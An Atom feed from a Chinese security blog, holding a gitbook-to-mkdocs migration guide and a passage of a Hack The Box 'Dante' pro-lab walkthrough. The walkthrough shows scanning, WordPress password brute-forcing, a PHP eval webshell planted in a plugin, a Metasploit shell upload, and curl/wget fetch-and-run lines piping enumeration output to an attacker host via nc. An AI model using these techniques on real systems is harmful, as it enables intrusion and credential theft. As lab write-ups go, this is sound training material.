<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="/feed.xml" rel="self" type="application/atom+xml" /><link href="/" rel="alternate" type="text/html" /><updated>2024-08-31T15:54:58+08:00</updated><id>/feed.xml</id><title type="html">DumKiy’s blog</title><subtitle>Watch And Learn
</subtitle><author><name>DumKiy</name></author><entry><title type="html">将 gitbook 迁移到 mkdocs</title><link href="/env/2024/01/02/Migrate-gitbook-to-mkdocs.html" rel="alternate" type="text/html" title="将 gitbook 迁移到 mkdocs" /><published>2024-01-02T20:29:48+08:00</published><updated>2024-01-02T20:29:48+08:00</updated><id>/env/2024/01/02/Migrate-gitbook-to-mkdocs</id><content type="html" xml:base="/env/2024/01/02/Migrate-gitbook-to-mkdocs.html"><![CDATA[<h1 id="将-gitbook-项目迁移到-mkdocs">将 gitbook 项目迁移到 mkdocs</h1>
<p>很多参考文档使用 gitbook 搭建，例如 <a href="https://cloud.hacktricks.xyz/welcome/readme">hacktricks-cloud</a>，由于 gitbook 不开源，如果想要将文档离线部署，就不得不更换其他文档生成工具，如 mkdocs、teedocs、docksify 等。</p>

<p>尝试了 teedoc 和 mkdocs，都存在部分问题：</p>
<ol>
  <li>teedoc 对于 markdown 图片链接的解析还存在问题，如果图片名包含空格，则链接中需要包含 <code class="language-plaintext highlighter-rouge">&lt;&gt;</code> 才能够被 markdown 解析，例如：
    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="o">![](</span>&lt;../.gitbook/assets/image <span class="o">(</span>193<span class="o">)</span>.png&gt;<span class="o">)</span>
</code></pre></div>    </div>
    <p>但 teedoc 无法将这种链接转化为图片链接。
 <img src="https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20240102224306.png" alt="20240102224306" /></p>
  </li>
  <li>gitbook 项目的结构通常在 SUMMARY.md 中定义，原始的 mkdocs 仅能够根据目录结构来定义文档结构，生成的文档结构往往是乱的。</li>
  <li>
    <p>gitbook 有着很多自身专用的语法，其他文档生成工具无法解析。例如：</p>

    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> {% content-ref url="pentesting-kubernetes-services.md" %}
</code></pre></div>    </div>
  </li>
  <li>gitbook 静态资源存储在 .gitbook/assets 中。mkdocs 在 build 时不会自动将 .gitbook 文件夹拷贝过去。</li>
</ol>

<p>通过查询资料，第二个问题可以通过 mkdocs-literate-nav 插件来解决，第三、四个问题可以通过 gitbook2mkdocs 部分解决。</p>

<h2 id="mkdocs-literate-nav-插件">mkdocs-literate-nav 插件</h2>
<p>安装 mkdocs-literate-nav 插件</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>proxychains python <span class="nt">-m</span> pip <span class="nb">install </span>mkdocs-section-index mkdocs-literate-nav
</code></pre></div></div>
<p>原生的 mkdocs 仅支持 yaml 格式来定义导航列表，例如：</p>
<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">nav</span><span class="pi">:</span>
  <span class="pi">-</span> <span class="na">Frob</span><span class="pi">:</span> <span class="s">index.md</span>
  <span class="pi">-</span> <span class="na">Baz</span><span class="pi">:</span> <span class="s">baz.md</span>
  <span class="pi">-</span> <span class="na">Borgs</span><span class="pi">:</span>
    <span class="pi">-</span> <span class="na">Bar</span><span class="pi">:</span> <span class="s">borgs/bar.md</span>
    <span class="pi">-</span> <span class="na">Foo</span><span class="pi">:</span> <span class="s">borgs/foo.md</span>
</code></pre></div></div>
<p>安装 mkdocs-literate-nav 插件后，可以直接使用 SUMMARY.md 来定义。只需要在 plugins 中添加 literate-nav。</p>
<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">plugins</span><span class="pi">:</span>
  <span class="pi">-</span> <span class="s">search</span>
  <span class="pi">-</span> <span class="na">literate-nav</span><span class="pi">:</span>
      <span class="na">nav_file</span><span class="pi">:</span> <span class="s">SUMMARY.md</span>
      <span class="na">tab_length</span><span class="pi">:</span> <span class="m">2</span>
</code></pre></div></div>
<p>但需要注意的是 mkdocs 中 SUMMARY.md 语法相对 gitbook 还有不同，不支持 <code class="language-plaintext highlighter-rouge">##</code> 这样的 markdown 标题，同级目录之间不能出现空行。</p>

<p>例如，gitbook 中原始的 SUMMARY.md 如下：</p>
<div class="language-markdown highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gu">## 👽 Welcome!</span>
<span class="p">  *</span> <span class="p">[</span><span class="nv">HackTricks Cloud</span><span class="p">](</span><span class="sx">README.md</span><span class="p">)</span>
<span class="p">  *</span> <span class="p">[</span><span class="nv">About the Author</span><span class="p">](</span><span class="sx">https://book.hacktricks.xyz/welcome/about-the-author</span><span class="p">)</span>
<span class="p">  *</span> <span class="p">[</span><span class="nv">HackTricks Values &amp; faq</span><span class="p">](</span><span class="sx">https://book.hacktricks.xyz/welcome/hacktricks-values-and-faq</span><span class="p">)</span>

<span class="gu">## 🏭 Pentesting CI/CD</span>
<span class="p">  *</span> <span class="p">[</span><span class="nv">Pentesting CI/CD Methodology</span><span class="p">](</span><span class="sx">pentesting-ci-cd/pentesting-ci-cd-methodology.md</span><span class="p">)</span>
<span class="p">  *</span> <span class="p">[</span><span class="nv">Github Security</span><span class="p">](</span><span class="sx">pentesting-ci-cd/github-security/README.md</span><span class="p">)</span>
</code></pre></div></div>
<p>更改为 mkdocs 中的 SUMMARY.md：</p>
<div class="language-markdown highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">*</span> 👽 Welcome!
<span class="p">  *</span> <span class="p">[</span><span class="nv">HackTricks Cloud</span><span class="p">](</span><span class="sx">README.md</span><span class="p">)</span>
<span class="p">  *</span> <span class="p">[</span><span class="nv">About the Author</span><span class="p">](</span><span class="sx">https://book.hacktricks.xyz/welcome/about-the-author</span><span class="p">)</span>
<span class="p">  *</span> <span class="p">[</span><span class="nv">HackTricks Values &amp; faq</span><span class="p">](</span><span class="sx">https://book.hacktricks.xyz/welcome/hacktricks-values-and-faq</span><span class="p">)</span>
<span class="p">*</span> 🏭 Pentesting CI/CD
<span class="p">  *</span> <span class="p">[</span><span class="nv">Pentesting CI/CD Methodology</span><span class="p">](</span><span class="sx">pentesting-ci-cd/pentesting-ci-cd-methodology.md</span><span class="p">)</span>
<span class="p">  *</span> <span class="p">[</span><span class="nv">Github Security</span><span class="p">](</span><span class="sx">pentesting-ci-cd/github-security/README.md</span><span class="p">)</span>
<span class="p">    *</span> <span class="p">[</span><span class="nv">Abusing Github Actions</span><span class="p">](</span><span class="sx">pentesting-ci-cd/github-security/</span>
</code></pre></div></div>
<p>另外，<code class="language-plaintext highlighter-rouge">tab_length: 2</code> 表示缩进 2 个空格，默认情况下为 4 个，可以根据原始 SUMMARY.md 格式进行修改。</p>

<h2 id="gitbook2mkdocs-插件">gitbook2mkdocs 插件</h2>
<ul>
  <li><a href="https://github.com/pledra/gitbook2mkdocs">pledra/gitbook2mkdocs</a></li>
</ul>

<p>gitbook2mkdocs 插件并不是特别完善，主要功能有两个：</p>
<ol>
  <li>转换部分 gitbook 中的专用语法。</li>
  <li>创建 .gitbook/assets 文件夹的 link：gbassets，并将生成的 html 中的图片连接进行替换。</li>
</ol>

<p>安装：</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pip3 <span class="nb">install </span>git+https://github.com/pledra/gitbook2mkdocs
</code></pre></div></div>

<p>使用方法：只需要在 plugins 中进行添加即可</p>
<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">plugins</span><span class="pi">:</span>
  <span class="pi">-</span> <span class="s">gitbook2mkdocs</span>
</code></pre></div></div>

<p>注意：</p>
<ol>
  <li>windows 下创建 symlink 需要管理员权限，执行 mkdocs build 前需要切换到管理员。</li>
  <li>gitbook2mkdocs 仅会对 docs/.gitbook/assets 文件夹进行操作，也就是项目文档直接放在 docs 目录下，如果多了一层目录，例如：docs/hacktricks/.gitbook/assets，那么该插件不会对目录进行复制（可以修改考虑源码或者手动将文件夹复制过去）。</li>
</ol>

<h1 id="参考资料">参考资料</h1>
<ul>
  <li><a href="https://ibm.github.io/workshop-setup/MKDOCS/">MkDocs - Workshop Setup</a></li>
  <li><a href="https://pypi.org/project/mkdocs-literate-nav/">mkdocs-literate-nav · PyPI</a></li>
  <li><a href="https://oprypin.github.io/mkdocs-literate-nav/reference.html#wildcards">参考 - mkdocs-literate-nav</a></li>
  <li><a href="https://github.com/pledra/gitbook2mkdocs">pledra/gitbook2mkdocs</a></li>
</ul>]]></content><author><name>DumKiy</name></author><category term="ENV" /><category term="gitbook" /><category term="mkdocs" /><summary type="html"><![CDATA[将 gitbook 项目迁移到 mkdocs 很多参考文档使用 gitbook 搭建，例如 hacktricks-cloud，由于 gitbook 不开源，如果想要将文档离线部署，就不得不更换其他文档生成工具，如 mkdocs、teedocs、docksify 等。 尝试了 teedoc 和 mkdocs，都存在部分问题： teedoc 对于 markdown 图片链接的解析还存在问题，如果图片名包含空格，则链接中需要包含 &lt;&gt; 才能够被 markdown 解析，例如： ![](&lt;../.gitbook/assets/image (193).png&gt;) 但 teedoc 无法将这种链接转化为图片链接。 gitbook 项目的结构通常在 SUMMARY.md 中定义，原始的 mkdocs 仅能够根据目录结构来定义文档结构，生成的文档结构往往是乱的。 gitbook 有着很多自身专用的语法，其他文档生成工具无法解析。例如： {% content-ref url="pentesting-kubernetes-services.md" %} gitbook 静态资源存储在 .gitbook/assets 中。mkdocs 在 build 时不会自动将 .gitbook 文件夹拷贝过去。 通过查询资料，第二个问题可以通过 mkdocs-literate-nav 插件来解决，第三、四个问题可以通过 gitbook2mkdocs 部分解决。 mkdocs-literate-nav 插件 安装 mkdocs-literate-nav 插件 proxychains python -m pip install mkdocs-section-index mkdocs-literate-nav 原生的 mkdocs 仅支持 yaml 格式来定义导航列表，例如： nav: - Frob: index.md - Baz: baz.md - Borgs: - Bar: borgs/bar.md - Foo: borgs/foo.md 安装 mkdocs-literate-nav 插件后，可以直接使用 SUMMARY.md 来定义。只需要在 plugins 中添加 literate-nav。 plugins: - search - literate-nav: nav_file: SUMMARY.md tab_length: 2 但需要注意的是 mkdocs 中 SUMMARY.md 语法相对 gitbook 还有不同，不支持 ## 这样的 markdown 标题，同级目录之间不能出现空行。 例如，gitbook 中原始的 SUMMARY.md 如下： ## 👽 Welcome! * [HackTricks Cloud](README.md) * [About the Author](https://book.hacktricks.xyz/welcome/about-the-author) * [HackTricks Values &amp; faq](https://book.hacktricks.xyz/welcome/hacktricks-values-and-faq) ## 🏭 Pentesting CI/CD * [Pentesting CI/CD Methodology](pentesting-ci-cd/pentesting-ci-cd-methodology.md) * [Github Security](pentesting-ci-cd/github-security/README.md) 更改为 mkdocs 中的 SUMMARY.md： * 👽 Welcome! * [HackTricks Cloud](README.md) * [About the Author](https://book.hacktricks.xyz/welcome/about-the-author) * [HackTricks Values &amp; faq](https://book.hacktricks.xyz/welcome/hacktricks-values-and-faq) * 🏭 Pentesting CI/CD * [Pentesting CI/CD Methodology](pentesting-ci-cd/pentesting-ci-cd-methodology.md) * [Github Security](pentesting-ci-cd/github-security/README.md) * [Abusing Github Actions](pentesting-ci-cd/github-security/ 另外，tab_length: 2 表示缩进 2 个空格，默认情况下为 4 个，可以根据原始 SUMMARY.md 格式进行修改。 gitbook2mkdocs 插件 pledra/gitbook2mkdocs gitbook2mkdocs 插件并不是特别完善，主要功能有两个： 转换部分 gitbook 中的专用语法。 创建 .gitbook/assets 文件夹的 link：gbassets，并将生成的 html 中的图片连接进行替换。 安装： pip3 install git+https://github.com/pledra/gitbook2mkdocs 使用方法：只需要在 plugins 中进行添加即可 plugins: - gitbook2mkdocs 注意： windows 下创建 symlink 需要管理员权限，执行 mkdocs build 前需要切换到管理员。 gitbook2mkdocs 仅会对 docs/.gitbook/assets 文件夹进行操作，也就是项目文档直接放在 docs 目录下，如果多了一层目录，例如：docs/hacktricks/.gitbook/assets，那么该插件不会对目录进行复制（可以修改考虑源码或者手动将文件夹复制过去）。 参考资料 MkDocs - Workshop Setup mkdocs-literate-nav · PyPI 参考 - mkdocs-literate-nav pledra/gitbook2mkdocs]]></summary></entry><entry><title type="html">HTB Prolab Dante walkthrough</title><link href="/pentest/2024/01/02/HTB-Prolab-Dante.html" rel="alternate" type="text/html" title="HTB Prolab Dante walkthrough" /><published>2024-01-02T18:29:48+08:00</published><updated>2024-01-02T18:29:48+08:00</updated><id>/pentest/2024/01/02/HTB-Prolab-Dante</id><content type="html" xml:base="/pentest/2024/01/02/HTB-Prolab-Dante.html"><![CDATA[<p><img src="https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20240102074246.png" alt="20240102074246" />
<!-- ![Alt text](../../../../../assets/image-12.png) --></p>

<h1 id="信息收集">信息收集</h1>
<h2 id="fscan">fscan</h2>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└─<span class="nv">$ </span>fscan <span class="nt">-h</span> 10.10.110.0/24

   ___                              _    
  / _ <span class="se">\ </span>    ___  ___ _ __ __ _  ___| | __ 
 / /_<span class="se">\/</span>____/ __|/ __| <span class="s1">'__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;    
\____/     |___/\___|_|  \__,_|\___|_|\_\   
                     fscan version: 1.8.2
start infoscan
trying RunIcmp2
The current user permissions unable to send icmp packets
start ping
(icmp) Target 10.10.110.2     is alive
(icmp) Target 10.10.110.100   is alive
[*] Icmp alive hosts len is: 2
10.10.110.100:21 open
10.10.110.100:22 open
[*] alive ports len is: 2
start vulscan
[+] ftp://10.10.110.100:21:anonymous 
</span></code></pre></div></div>
<p>存活主机：</p>
<ul>
  <li>10.10.110.2</li>
  <li>10.10.110.100</li>
</ul>

<p>ftp://10.10.110.100:21 允许匿名登陆。</p>

<p>对 10.10.110.100 进行全端口扫描，注意需要加上 sudo，</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nmap <span class="nt">-T4</span> <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-p-</span> <span class="nt">--min-rate</span><span class="o">=</span>1000 10.10.110.100
</code></pre></div></div>
<p>nmap 扫描结果中有一个 flag，65000 开放了一个 apache2，上面运行了一个 wordpress 服务。</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.14.2
|      Logged <span class="k">in </span>as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session <span class="nb">timeout </span><span class="k">in </span>seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed <span class="o">(</span>FTP code 230<span class="o">)</span>
|_Can<span class="s1">'t get directory listing: PASV IP 172.16.1.100 is not the same as 10.10.110.100
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 8f:a2:ff:cf:4e:3e:aa:2b:c2:6f:f4:5a:2a:d9:e9:da (RSA)
|   256 07:83:8e:b6:f7:e6:72:e9:65:db:42:fd:ed:d6:93:ee (ECDSA)
|_  256 13:45:c5:ca:db:a6:b4:ae:9c:09:7d:21:cd:9d:74:f4 (ED25519)
65000/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-robots.txt: 2 disallowed entries 
|_/wordpress DANTE{Y0u_Cant_G3t_at_m3_br0!}
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
</span></code></pre></div></div>
<h2 id="ftp-匿名登陆">ftp 匿名登陆</h2>
<p>ftp 允许匿名登陆，一开始会出现：</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>229 Entering Extended Passive Mode <span class="o">(||</span>|58413|<span class="o">)</span>
</code></pre></div></div>
<p>等待一段时间后可以正常执行命令。Transfer/Incoming 中有一个 todo.txt</p>

<p>内容如下：</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- Finalize Wordpress permission changes - PENDING
- Update links to to utilize DNS Name prior to changing to port 80 - PENDING
- Remove LFI vuln from the other site - PENDING
- Reset James<span class="s1">' password to something more secure - PENDING
- Harden the system prior to the Junior Pen Tester assessment - IN PROGRESS
</span></code></pre></div></div>

<h2 id="wordpress-后台-getshell">wordpress 后台 getshell</h2>

<p><img src="https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20240102074942.png" alt="20240102074942" /></p>

<!-- ![Alt text](../../../../../assets/image-1.png) -->

<p>使用 wpscan 扫描。</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wpscan <span class="nt">--url</span> http://10.10.110.100:65000/wordpress <span class="nt">--enumerate</span>
</code></pre></div></div>
<p>版本为 WordPress version 5.4.1，没有找到存在漏洞的插件，存在用户 admin 和 james。</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>+] URL: http://10.10.110.100:65000/wordpress/ <span class="o">[</span>10.10.110.100]
<span class="o">[</span>+] Started: Fri Dec 22 22:12:24 2023

Interesting Finding<span class="o">(</span>s<span class="o">)</span>:

<span class="o">[</span>+] Headers
 | Interesting Entry: Server: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
 | Found By: Headers <span class="o">(</span>Passive Detection<span class="o">)</span>
 | Confidence: 100%

<span class="o">[</span>+] robots.txt found: http://10.10.110.100:65000/wordpress/robots.txt
 | Found By: Robots Txt <span class="o">(</span>Aggressive Detection<span class="o">)</span>
 | Confidence: 100%

<span class="o">[</span>+] XML-RPC seems to be enabled: http://10.10.110.100:65000/wordpress/xmlrpc.php
 | Found By: Direct Access <span class="o">(</span>Aggressive Detection<span class="o">)</span>
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

<span class="o">[</span>+] WordPress readme found: http://10.10.110.100:65000/wordpress/readme.html
 | Found By: Direct Access <span class="o">(</span>Aggressive Detection<span class="o">)</span>
 | Confidence: 100%

<span class="o">[</span>+] Debug Log found: http://10.10.110.100:65000/wordpress/wp-content/debug.log
 | Found By: Direct Access <span class="o">(</span>Aggressive Detection<span class="o">)</span>
 | Confidence: 100%
 | Reference: https://codex.wordpress.org/Debugging_in_WordPress

<span class="o">[</span>+] Upload directory has listing enabled: http://10.10.110.100:65000/wordpress/wp-content/uploads/
 | Found By: Direct Access <span class="o">(</span>Aggressive Detection<span class="o">)</span>
 | Confidence: 100%

<span class="o">[</span>+] The external WP-Cron seems to be enabled: http://10.10.110.100:65000/wordpress/wp-cron.php
 | Found By: Direct Access <span class="o">(</span>Aggressive Detection<span class="o">)</span>
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

<span class="o">[</span>+] WordPress version 5.4.1 identified <span class="o">(</span>Insecure, released on 2020-04-29<span class="o">)</span><span class="nb">.</span>
 | Found By: Atom Generator <span class="o">(</span>Aggressive Detection<span class="o">)</span>
 |  - http://10.10.110.100:65000/wordpress/?feed<span class="o">=</span>atom, &lt;generator <span class="nv">uri</span><span class="o">=</span><span class="s2">"https://wordpress.org/"</span> <span class="nv">version</span><span class="o">=</span><span class="s2">"5.4.1"</span><span class="o">&gt;</span>WordPress&lt;/generator&gt;
 | Confirmed By: Style Etag <span class="o">(</span>Aggressive Detection<span class="o">)</span>
 |  - http://10.10.110.100:65000/wordpress/wp-admin/load-styles.php, Match: <span class="s1">'5.4.1'</span>

<span class="o">[</span>i] The main theme could not be detected.

<span class="o">[</span>+] Enumerating Vulnerable Plugins <span class="o">(</span>via Passive Methods<span class="o">)</span>

<span class="o">[</span>i] No plugins Found.

<span class="o">[</span>i] User<span class="o">(</span>s<span class="o">)</span> Identified:

<span class="o">[</span>+] admin
 | Found By: Author Posts - Author Pattern <span class="o">(</span>Passive Detection<span class="o">)</span>
 | Confirmed By:
 |  Rss Generator <span class="o">(</span>Passive Detection<span class="o">)</span>
 |  Wp Json Api <span class="o">(</span>Aggressive Detection<span class="o">)</span>
 |   - http://10.10.110.100:65000/wordpress/index.php/wp-json/wp/v2/users/?per_page<span class="o">=</span>100&amp;page<span class="o">=</span>1
 |  Author Id Brute Forcing - Author Pattern <span class="o">(</span>Aggressive Detection<span class="o">)</span>
 |  Login Error Messages <span class="o">(</span>Aggressive Detection<span class="o">)</span>

<span class="o">[</span>+] james
 | Found By: Author Id Brute Forcing - Author Pattern <span class="o">(</span>Aggressive Detection<span class="o">)</span>
 | Confirmed By: Login Error Messages <span class="o">(</span>Aggressive Detection<span class="o">)</span>

<span class="o">[!]</span> No WPScan API Token given, as a result vulnerability data has not been output.
<span class="o">[!]</span> You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
</code></pre></div></div>

<p>todo.txt 中指出 james 的密码不太安全，可以考虑爆破 james 的密码。字典可以使用 rockyou.txt，但很久都没爆出来。</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wpscan <span class="nt">--url</span> http://10.10.110.100:65000/wordpress <span class="nt">-U</span> james <span class="nt">-P</span> /webtools/dicts/rockyou.txt <span class="nt">--proxy</span> http://127.0.0.1:8080
</code></pre></div></div>
<p>参考 Tamarisk 的 writeup，也可以考虑使用页面的内容或者其他敏感内容生成字典，实在爆破不出来时可以考虑这种方法。cewl 是一个用于生成自定义单词列表的工具,可以爬取指定 URL 的网页内容，返回一个单词列表，用生成的字典爆破之后可以得到密码 Toyota。该密码也在 rockyou.txt ，但表单的爆破确实比较慢。</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cewl http://10.10.110.100:65000/wordpress/index.php/languages-and-frameworks <span class="o">&gt;</span> words.txt
</code></pre></div></div>
<p>以 james 用户进入后台后，james 正好属于 Administrator。Wordpress 后台 getshell 的相关利用方法可以参考：<a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/wordpress#plugin-rce">Wordpress - HackTricks</a>，主要有以下的几种方法：</p>
<ol>
  <li>修改主题模板。</li>
  <li>修改插件文件。</li>
  <li>上传插件。</li>
</ol>

<p>访问 /wordpress/wp-admin/theme-editor.php?file=404.php&amp;theme=twentytwenty 修改 404.php。添加一句话：</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">eval</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">"pass"</span><span class="p">]);</span>
</code></pre></div></div>
<p>但保存时得到<code class="language-plaintext highlighter-rouge">Unable to communicate back with site to check for fatal errors, so the PHP change was reverted. You will need to upload your PHP file change by some other means, such as by using SFTP.</code> 的错误，该报错是 Wordpress 4.9 之后添加的功能，会在 WP 文件编辑器中无法修改 php 文件。</p>

<p>使用 Plugin Editor 修改插件文件时可以正常保存，例如修改 akismet/class.akismet-cli.php。修改后访问：/wordpress/wp-content/plugins/akismet/class.akismet-cli.php 即可。</p>

<p>MSF 中也集成了相关 exp，但好像没法正常上传 payload。</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>use exploit/unix/webapp/wp_admin_shell_upload
msf6 exploit<span class="o">(</span>unix/webapp/wp_admin_shell_upload<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>lhost 10.10.14.5
msf6 exploit<span class="o">(</span>unix/webapp/wp_admin_shell_upload<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>lport 3333
msf6 exploit<span class="o">(</span>unix/webapp/wp_admin_shell_upload<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>PASSWORD Toyota
msf6 exploit<span class="o">(</span>unix/webapp/wp_admin_shell_upload<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>USERNAME james
msf6 exploit<span class="o">(</span>unix/webapp/wp_admin_shell_upload<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>targeturi /wordpress
msf6 exploit<span class="o">(</span>unix/webapp/wp_admin_shell_upload<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>rhosts 10.10.110.100
msf6 exploit<span class="o">(</span>unix/webapp/wp_admin_shell_upload<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>rport 65000
msf6 exploit<span class="o">(</span>unix/webapp/wp_admin_shell_upload<span class="o">)</span> <span class="o">&gt;</span> exploit 

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Started reverse TCP handler on 10.10.14.5:4444 
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Authenticating with WordPress using james:Toyota...
<span class="o">[</span>+] Authenticated with WordPress
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Preparing payload...
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Uploading payload...
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Executing the payload at /wordpress/wp-content/plugins/bpjosOzqKn/skfipPVLfx.php...
<span class="o">[!]</span> This exploit may require manual cleanup of <span class="s1">'skfipPVLfx.php'</span> on the target
<span class="o">[!]</span> This exploit may require manual cleanup of <span class="s1">'bpjosOzqKn.php'</span> on the target
<span class="o">[!]</span> This exploit may require manual cleanup of <span class="s1">'../bpjosOzqKn'</span> on the target
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Exploit completed, but no session was created.
</code></pre></div></div>

<p>获取到 webshell 之后开始本地环境的信息收集。</p>
<ul>
  <li>内网 ip 172.16.1.100, 网关 172.16.1.1，其他主机 172.16.1.20</li>
  <li>本地存在 mysql 服务。可以在 wp-config 中拿到用户名密码：shaun/password，但数据库中似乎没有什么有用的信息。
    <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>      <span class="nb">define</span><span class="p">(</span> <span class="s1">'DB_NAME'</span><span class="p">,</span> <span class="s1">'wordpress'</span> <span class="p">);</span>

      <span class="cd">/** MySQL database username */</span>
      <span class="nb">define</span><span class="p">(</span> <span class="s1">'DB_USER'</span><span class="p">,</span> <span class="s1">'shaun'</span> <span class="p">);</span>

      <span class="cd">/** MySQL database password */</span>
      <span class="nb">define</span><span class="p">(</span> <span class="s1">'DB_PASSWORD'</span><span class="p">,</span> <span class="s1">'password'</span> <span class="p">);</span>
</code></pre></div>    </div>
  </li>
  <li>james 用户目录下有一个 flag.txt，但仅能够以 james 用户的身份读取。可以想办法获取 james 用户的密码，或者提权到 root 后在切换到 james 用户。</li>
</ul>

<h2 id="linux-提权">linux 提权</h2>
<p>全面收集信息可以使用 linPEAS 或者 lse</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># linPEAS</span>
nc <span class="nt">-lvnp</span> 9002 | <span class="nb">tee </span>linpeas.out <span class="c">#Host</span>
curl 10.10.14.5:9999/linpeas.sh | sh | nc 10.10.14.5 9002 <span class="c">#Victim</span>

<span class="c"># lse</span>
nc <span class="nt">-lvnp</span> 9002 | <span class="nb">tee </span>lse.out <span class="c">#Host</span>

bash &lt;<span class="o">(</span>wget <span class="nt">-q</span> <span class="nt">-O</span> - <span class="s2">"http://10.10.14.5:9999/lse_cve.sh"</span><span class="o">)</span> <span class="nt">-l1</span> <span class="nt">-i</span> | nc 10.10.14.5 9002 <span class="c">#Victim</span>

bash &lt;<span class="o">(</span>wget <span class="nt">-q</span> <span class="nt">-O</span> - <span class="s2">"http://10.10.14.5:9999/lse_cve.sh"</span><span class="o">)</span> <span class="nt">-l2</span> <span class="nt">-i</span> | nc 10.10.14.5 9002 <span class="c">#Victim</span>
</code></pre></div></div>

<p>除了 james 之外还有一个 balthazar 用户。linPEAS 在 james 的 bash_history 文件中找到了一个密码。</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>╔══════════╣ Searching passwords <span class="k">in </span><span class="nb">history </span>files
/home/james/.bash_history:rm .mysql_history
/home/james/.bash_history:mysql <span class="nt">-u</span> balthazar <span class="nt">-p</span> TheJoker12345!
</code></pre></div></div>
<p>使用该密码可以正常登陆 ssh，结合前面使用 linPEAS 的结果，目标存在多个提权漏洞：</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>+] <span class="o">[</span>CVE-2022-2586] nft_object UAF

   Details: https://www.openwall.com/lists/oss-security/2022/08/29/5
   Exposure: probable
   Tags: <span class="o">[</span> <span class="nv">ubuntu</span><span class="o">=(</span>20.04<span class="o">)</span> <span class="o">]{</span>kernel:5.12.13<span class="o">}</span>
   Download URL: https://www.openwall.com/lists/oss-security/2022/08/29/5/1
   Comments: kernel.unprivileged_userns_clone<span class="o">=</span>1 required <span class="o">(</span>to obtain CAP_NET_ADMIN<span class="o">)</span>

<span class="o">[</span>+] <span class="o">[</span>CVE-2021-4034] PwnKit

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: probable
   Tags: <span class="o">[</span> <span class="nv">ubuntu</span><span class="o">=</span>10|11|12|13|14|15|16|17|18|19|20|21 <span class="o">]</span>,debian<span class="o">=</span>7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main

